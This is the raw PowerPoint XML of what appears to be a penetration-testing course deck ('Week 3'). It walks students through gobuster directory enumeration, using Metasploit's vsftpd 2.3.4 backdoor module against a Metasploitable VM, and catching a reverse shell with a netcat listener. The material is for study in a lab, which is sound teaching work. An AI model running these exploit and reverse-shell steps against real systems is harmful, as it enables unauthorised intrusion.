              <a:rPr lang="en-US" altLang="en-US" sz="1900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="005D7E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Enumeration (Components)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1900" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="005D7E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gobuster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dir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-u http://localhost:8080/components/ -w /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usr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/share/wordlists/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dirb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/common.txt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b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="005D7E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b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="005D7E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>5 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="005D7E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Directory Enumeration (Plugins)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1900" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="005D7E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gobuster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dir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 -u http://localhost:8080/plugins/ -w /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usr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/share/wordlists/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dirb</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1900" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>common.tx</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1900" dirty="0">
              <a:solidFill>
                <a:srgbClr val="CE5DD1"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1900" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="7030A0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1900" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="7030A0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1900" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1900" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="7030A0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1900" b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5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8900"/>
            <a:ext cx="11887200" cy="69360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Task 04: The First Shell - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> Basics </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Description:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Use the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Framework to launch your first successful exploit. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Technical Requirements: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○ Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>msfconsole</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> to search for modules related to the CVEs </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>found’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in Task </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>02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○ Set up </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>PAYLOAD</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>LHOST</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>RHOST</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> correctly. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>○ Execute an exploit against a vulnerable VM (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Metasploitable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> 2 or 3).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Bonus:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Use a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>Netcat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> listener</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>nc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>lvnp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>) to catch a "Reverse Shell"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manually</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Learning Goal:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Experience the transition from a "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>scanner“</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>to a "hacker" by gaining an interactive session.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771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4 Target :- Task 2’s findings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728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5757626" cy="6858000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Search for an Exploit Module</a:t>
            </a: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Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>msfconsole</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> to find exploit modules related to the CVEs or vulnerable services identified in </a:t>
            </a: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Task 02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Example:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill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 err="1">
                <a:solidFill>
                  <a:srgbClr val="9F2EA2"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>msfconsole</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="9F2EA2"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="9F2EA2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9F2EA2"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>search </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="9F2EA2"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>vsftpd</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="17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/>
              <a:t>2 Select the Exploit Module</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="17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rgbClr val="9F2EA2"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>use exploit/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="9F2EA2"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>unix</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="9F2EA2"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>/ftp/vsftpd_234_backdoor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/>
              <a:t>Configure the Required Options</a:t>
            </a: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 smtClean="0"/>
              <a:t>Required </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Options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/>
              <a:t>Example:</a:t>
            </a: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rgbClr val="9F2EA2"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>set RHOST 192.168.56.102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rgbClr val="9F2EA2"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>set LHOST 192.168.56.101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Check options:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1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rgbClr val="9F2EA2"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>          show options</a:t>
            </a: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b="1" dirty="0"/>
              <a:t>Run the Exploit</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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solidFill>
                  <a:srgbClr val="9F2EA2"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>               run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/>
              <a:t>If successful, you should obtain a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>shell session</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="17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/>
              <a:t>Then test access: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 err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>whoami</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRP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700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>id</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>uname</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -a</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="17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7626" y="0"/>
            <a:ext cx="4692659" cy="661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3 Configure the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480898"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="5757626" y="427307"/>
          <a:ext cx="5457372" cy="1148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403">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3106947933"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="4191969">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3286312555"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="236111">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" dirty="0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365870"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="236111">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200"/>
                        <a:t>RHOST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Target IP </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" dirty="0" smtClean="0"/>
                        <a:t>The</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" baseline="0" dirty="0" smtClean="0"/>
                        <a:t> target you tested in week2 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664523"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="180791">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200"/>
                        <a:t>LHOST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Your Kali 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75942"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="325899">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200"/>
                        <a:t>PAYLOAD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Reverse shell or </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" dirty="0" err="1"/>
                        <a:t>meterpreter</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" dirty="0"/>
                        <a:t> payload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733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18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88899"/>
            <a:ext cx="11916229" cy="6660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Bonus </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>– Catch a Reverse Shell Manually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Start a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Netcat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> listener on Kali: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rgbClr val="CE5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>nc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>lvnp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="CE5DD1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 4444</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Then run an exploit or payload that connects back to this listener.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0"/>
              <a:t>Expected </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Result</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>You should obtain an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>interactive shell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> on the vulnerable machine.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>whoami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hostname</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Id</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Take a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>screenshot of the shell session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Learning Goal</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Understand the transition from:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Scanning → Vulnerability Identification → Exploitation → Shell Access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demonstrates the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>initial foothold stage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> of penetration testing.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46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093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2377</TotalTime>
  <Words>2319</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>488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Arial</vt:lpstr>
      <vt:lpstr>Arial Black</vt:lpstr>
      <vt:lpstr>Arial Unicode MS</vt:lpstr>
      <vt:lpstr>Bahnschrift SemiBold</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Courier New</vt:lpstr>
      <vt:lpstr>Times New Roman</vt:lpstr>
      <vt:lpstr>Trebuchet MS</vt:lpstr>
      <vt:lpstr>ui-monospace</vt:lpstr>
      <vt:lpstr>Wingdings</vt:lpstr>
      <vt:lpstr>Wingdings 3</vt:lpstr>
      <vt:lpstr>Facet</vt:lpstr>
      <vt:lpstr>Week 3</vt:lpstr>
      <vt:lpstr>Vulnerability Assessment, Initial Exploitation &amp; Web Application Penetration Testing (OWASP Top 10)</vt:lpstr>
      <vt:lpstr>Task 01: Advanced Web Directory &amp; Parameter Discovery </vt:lpstr>
      <vt:lpstr>TASK 1 Target :- hackthissite.org </vt:lpstr>
      <vt:lpstr>Task 01: Advanced Web Directory &amp; Parameter Discovery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02</vt:lpstr>
      <vt:lpstr>Task 02: CVE Mapping &amp; Exploit Research </vt:lpstr>
      <vt:lpstr>TASK 2 Target:- Metasploitable 2</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Task 03: CMS Vulnerability Scanning (WordPress/Joomla) </vt:lpstr>
      <vt:lpstr>Task 3 Target:- https://github.com/wpscanteam/VulnerableWordPress.git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Joomla Vulnerability Scanning with JoomScan</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Task 4 Target :- Task 2’s findings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creator>Gh0stRift</dc:creator>
  <cp:lastModifiedBy>Gh0stRift</cp:lastModifiedBy>
  <cp:revision>133</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-03-07T10:08:16Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-07-04T07:41:21Z</dcterms:modified>
</cp:coreProperties>
</file>